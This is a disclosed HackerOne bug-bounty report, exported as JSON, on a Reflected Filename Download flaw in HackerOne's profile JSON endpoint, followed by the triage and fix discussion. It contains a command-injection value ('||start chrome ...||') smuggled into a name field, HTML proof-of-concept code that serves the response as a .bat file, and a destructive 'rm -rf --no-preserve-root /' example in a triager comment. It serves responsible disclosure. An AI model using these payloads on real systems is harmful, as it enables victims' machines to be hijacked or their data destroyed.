{"id":54034,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NDAzNA==","url":"https://hackerone.com/reports/54034","title":"Reflected Filename Download","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-03-31T15:56:55.707Z","submitted_at":"2015-03-31T15:56:55.707Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dsopas","url":"/dsopas","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-04-25T08:39:01.632Z","bug_reporter_agreed_on_going_public_at":"2016-04-25T08:39:01.548Z","team_member_agreed_on_going_public_at":"2016-04-25T02:14:12.517Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"First of all congratulations on awesome bounty system. Big fan here! \r\nI found out that it's possible run a RFD attack on Hackerone.\r\n\r\nIf we visit:\r\nhttps://hackerone.com/dsopas\r\n\r\nWe see the normal HTML webpage. Nothing new here.\r\nBut if we add ?format=json to the URL we can see the JSON file generated by my profile.\r\n\r\nhttps://hackerone.com/dsopas?format=json\r\n\r\n{\"id\":15486,\"username\":\"dsopas\",\"name\":\"David Sopas\\\"||start chrome websegura.net||\",\"url\":\"https://hackerone.com/dsopas\",\"profile_pictures\":{\"small\":\"\\u003cimg class=\\\"avatar small circle \\\" alt=\\\"dsopas\\\" title=\\\"David Sopas\\u0026quot;||start chrome websegura.net|| (dsopas)\\\" src=\\\"https://profile-photos.hackerone-user-content.com/production/000/015/486/fe059c014e6e7a110a8e9611751b0e68b62bf009_small.jpg?1426253052\\\" /\\u003e\",\"medium\":\"\\u003cimg class=\\\"avatar medium circle \\\" alt=\\\"dsopas\\\" title=\\\"David Sopas\\u0026quot;||start chrome websegura.net|| (dsopas)\\\" src=\\\"https://profile-photos.hackerone-user-content.com/production/000/015/486/faf9fd47449682d2fc487a2b69425032e4c28d03_medium.jpg?1426253052\\\" /\\u003e\"},\"profile_picture_urls\":{\"small\":\"https://profile-photos.hackerone-user-content.com/production/000/015/486/fe059c014e6e7a110a8e9611751b0e68b62bf009_small.jpg?1426253052\",\"medium\":\"https://profile-photos.hackerone-user-content.com/production/000/015/486/faf9fd47449682d2fc487a2b69425032e4c28d03_medium.jpg?1426253052\"},\"disabled\":false,\"bug_count\":1,\"target_count\":1,\"reputation\":92,\"rank\":null}\r\n\r\nWhat is funny about this is that I can inject under my name the reflected part of a RFD vulnerability.\r\nCheck out my online proof-of-concept:\r\n\r\nHTML:\r\n\u003cdiv align=\"center\"\u003e\r\n\u003ca href=\"https://hackerone.com/dsopas?format=json\" download=\"HackerOneBonus.bat\" onclick=\"return false;\"\u003eHackerOne.com Bonus App\u003c/a\u003e\r\n\u003cp\u003e\u003ci\u003e(Use \"Save link as\" to download the file)\u003c/i\u003e\u003c/p\u003e\r\n\u003c/div\u003e \r\n\r\nhttp://www.websegura.net/hackerone_rfd.htm\r\n\r\nRunning the batch file in this PoC will only open my portuguese personal website - websegura.net with Google Chrome. But this can be changed with many malicious commands.\r\n\r\nDue to filename restritions on the HackerOne path we need to use HTML5 \u003cA DOWNLOAD\u003e attribute to do this. Due to this situation the following browsers are supported:\r\n\r\n- Chrome\r\n- Opera\r\n- Android Browser\r\n- Chrome for Android\r\n- Firefox [forcing the user to \"Save Link As\"]\r\n\r\nWhat this will do is when the user click on the download link will get a file supposed to be on HackerOne.com [a trusted domain] gaining credibility from the victim.\r\n\r\nSo a possible attack scenario will be:\r\n1. Malicious user shares his manipulated URL\r\n2. Victims clicks on the link and checks that the file is stored on trusted HackerOne servers and runs it\r\n3. Victims computer gets hijacked\r\n\r\nI attached some screens.\r\n\r\nHow to fix this?\r\nA possible solution is to sanitize for special chars like \"||\" in the account fields and use \"content-disposition\" header to force the filename name.\r\n\r\nFeel free to reply if you have any questions or need more information.\r\nIt was a great challenge to find this on HackerOne :)","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":33258,"file_name":"hackerone_chrome.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/033/258/ab146211e84f85a7841b6b709f2b428da87e2c59/hackerone_chrome.jpg?response-content-disposition=attachment%3B%20filename%3D%22hackerone_chrome.jpg%22%3B%20filename%2A%3DUTF-8%27%27hackerone_chrome.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150957Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=deb0528318b0933d99223f9c0fc89e51bbd37946de95c6164d49da068d453960","file_size":18347,"type":"image/jpeg"},{"id":33259,"file_name":"hackerone_opera.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/033/259/c111e29aded95622c1512518fd420eec8b055404/hackerone_opera.jpg?response-content-disposition=attachment%3B%20filename%3D%22hackerone_opera.jpg%22%3B%20filename%2A%3DUTF-8%27%27hackerone_opera.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150957Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8eb37b5f6a61a3a61adf6f2ed453a9e76253ffb9a1113234b7027e3f2668caa8","file_size":33796,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2016-05-25T02:14:12.596Z","allow_singular_disclosure_after":-169822544.8576816,"singular_disclosure_allowed":true,"vote_count":6,"voters":["an40r1","hogarth45","spetr0x","dyabla","deandre_7","golaroo"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":367346,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @dsopas,\n\nCool find! A victim will have to do a few silly things to make this work (who runs a .bat from some random website, even if the href says hackerone.com?!), but we've all done silly things on Monday morning before the coffee kicks in. I'll take a look at solving this issue.\n\nThe w3c specs indicate that simply setting Content-Disposition: inline; filename=\"response.json\" will override the download attribute, and tests indicate that this stops your PoC from working.\n\nFiltering characters isn't going to sufficiently solve this, unless we set unreasonably strict rules (e.g. having `rm -rf --no-preserve-root /` and showing it as `.sh` script will work unless we prohibit the `-`, which is just too strict). \n\nIf a user can be convinced to download a `.json` file, change the extension to `.bat`, and then execute it, I don't think there's any helping them.\n\nWill keep you posted!\n\nDirk","automated_response":false,"created_at":"2015-04-01T12:13:39.239Z","updated_at":"2015-04-01T12:13:39.239Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":367351,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Dirk,\n\nThanks. It was cool to find this issue.\nYes, Content-Disposition header will be enough to fix this and you are right filtering is not sufficient. I already tried that.\n\nCheers,\nDavid Sopas","automated_response":false,"created_at":"2015-04-01T12:17:39.700Z","updated_at":"2015-04-01T12:17:39.700Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":371101,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As of earlier today, a change has been made that fixes this issue. Could you please verify that the problem is correctly resolved? ","automated_response":false,"created_at":"2015-04-03T18:26:37.974Z","updated_at":"2015-04-03T18:26:37.974Z","actor":{"username":"pei","cleared":false,"url":"/pei","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/939/2d83322336a492279dc84d8f92f280c2d54fcb5b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":371319,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey pei,\n\nI confirm that it's fixed. Congrats on a great patch timeline.","automated_response":false,"created_at":"2015-04-03T22:52:10.317Z","updated_at":"2015-04-03T22:52:10.317Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":371341,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@dsopas, thank you. Closing this report as resolved. We don't consider this eligible for a bounty (only hall of fame) due to the high friction of exploiting it. Happy hacking!","automated_response":false,"created_at":"2015-04-03T23:32:44.062Z","updated_at":"2015-04-03T23:32:44.062Z","actor":{"username":"pei","cleared":false,"url":"/pei","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/939/2d83322336a492279dc84d8f92f280c2d54fcb5b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dsopas","url":"/dsopas"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":371796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey pei, if you don't mind I disagree. It's still a security issue that might be used to exploit hackerone. It took some time and it was a challenge to still find something on hackerone. But ok...","automated_response":false,"created_at":"2015-04-04T07:04:22.201Z","updated_at":"2015-04-04T07:04:22.201Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":385433,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"We agree that this is a missing best practice, which is worth addressing but doesn't pose a severe issue on its own. The users of HackerOne are smart enough not to download/execute some arbitrary bat file.","automated_response":false,"created_at":"2015-04-20T13:28:10.049Z","updated_at":"2015-04-20T13:35:01.988Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":386190,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. pei already explain it that it only deserved a HoF so I understand.\nThanks again for the feedback.","automated_response":false,"created_at":"2015-04-21T06:52:48.189Z","updated_at":"2015-04-21T06:52:48.189Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":925390,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-04-25T02:14:12.550Z","updated_at":"2016-04-25T02:14:12.550Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":925704,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-04-25T08:39:01.582Z","updated_at":"2016-04-25T08:39:01.582Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":925705,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-04-25T08:39:01.667Z","updated_at":"2016-04-25T08:39:01.667Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}